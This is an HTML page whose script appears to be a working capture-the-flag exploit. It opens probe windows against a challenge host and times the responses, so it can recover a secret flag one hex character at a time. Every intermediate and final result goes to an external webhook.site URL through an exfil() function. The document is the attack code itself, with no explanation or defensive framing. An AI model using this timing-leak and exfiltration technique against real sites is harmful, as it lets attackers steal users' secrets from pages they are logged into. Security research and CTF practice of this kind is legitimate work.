<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
// v7 - pure sequential, early exit, start from known prefix
var T="https://svfgp.breakable.live";
var W="https://webhook.site/306c9b82-bc9d-4987-bbcf-8abd283ef3eb";
var known="CTF{1651084a";
var HEX="0123456789abcdef";
var THRESH=320; // match ~460ms, non-match ~150ms, threshold in between

function exfil(d){
  var u=W+"?d="+encodeURIComponent(d)+"&t="+Date.now();
  fetch(u,{mode:"no-cors",cache:"no-store"}).catch(function(){});
}

exfil("v7_LOADED");

function probeOne(q){
  return new Promise(function(res){
    var sid="s"+Math.random().toString(36).slice(2,10);
    var rid="r"+Math.random().toString(36).slice(2,10);
    var url=T+"/?mode=probe&q="+encodeURIComponent(q)+
      "&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
    var t0=performance.now();
    var w;
    try{w=window.open(url,"probewin");}catch(e){res(0);return;}
    if(!w){res(0);return;}
    var done=false;
    function fin(ms){if(done)return;done=true;try{w.close();}catch(e){}res(Math.round(ms));}
    function handler(e){
      if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
        window.removeEventListener("message",handler);
        fin(performance.now()-t0);
      }
    }
    window.addEventListener("message",handler);
    setTimeout(function(){window.removeEventListener("message",handler);fin(-1);},3000);
  });
}

async function findChar(prefix,pos){
  // Test each hex char, return as soon as one is slow (> threshold)
  for(var i=0;i<16;i++){
    var ch=HEX[i];
    var t=await probeOne(prefix+ch);
    if(t>THRESH){
      exfil("HIT:p"+pos+"="+ch+"("+t+"ms)");
      return ch;
    }
  }
  // None exceeded threshold - pick max from a second pass
  exfil("MISS_P"+pos+":retry");
  var best={c:"",t:0};
  for(var i=0;i<16;i++){
    var ch=HEX[i];
    var t=await probeOne(prefix+ch);
    if(t>best.t)best={c:ch,t:t};
  }
  exfil("RETRY_P"+pos+":"+best.c+"="+best.t+"ms");
  return best.c;
}

async function run(){
  exfil("v7_START:"+known+"(len="+known.length+")");
  var t0=Date.now();
  var needed=4+64-known.length; // how many more chars needed

  for(var p=0;p<needed;p++){
    if(Date.now()-t0>52000){exfil("TIME:"+known);break;}
    var pos=known.length-4;
    var ch=await findChar(known,pos);
    known+=ch;
    exfil("F:"+known);
  }

  if(known.length===4+64)known+="}";
  exfil("DONE:"+known);
}

setTimeout(run,200);
</script></body></html>
